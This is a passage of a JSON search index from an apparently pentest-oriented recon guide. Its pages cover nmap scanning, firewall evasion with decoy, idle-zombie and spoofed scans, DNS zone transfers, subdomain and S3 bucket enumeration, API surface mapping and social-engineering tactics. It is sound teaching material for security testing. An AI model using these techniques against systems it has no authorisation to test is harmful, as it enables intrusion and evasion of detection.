    "c": "Get people to talk  Attack tree  1 Use social engineering tactics commonly used in interrogations for conversations 1.1 Build rapport early in the engagement in order to gain trust and lower the subject's guard 1.2 Show genuine interest 1.3 Use mirroring a few words for gathering more information 1.4 Use labeling to figure out what is going on without directly asking Notes  When interviewing or interrogating people, a number of physical reactions to questions can be used to identify topic areas that should lead to more questioning. Resources  The social engineer: Interview and Interrogation The social engineer: Influencing Others",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL 